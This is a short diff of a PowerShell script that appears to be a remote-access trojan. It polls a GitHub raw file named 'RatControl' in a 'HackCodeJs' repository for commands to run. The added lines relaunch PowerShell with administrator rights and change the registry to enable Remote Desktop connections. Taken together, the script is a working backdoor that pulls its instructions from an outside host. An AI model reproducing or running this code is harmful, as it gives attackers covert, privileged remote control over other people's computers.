@@ -1,4 +1,6 @@
+Start-Process powershell -Verb runAs
 $Com =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 while ($true) {
 $Com2 =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
   if ($Com -eq $Com2) {
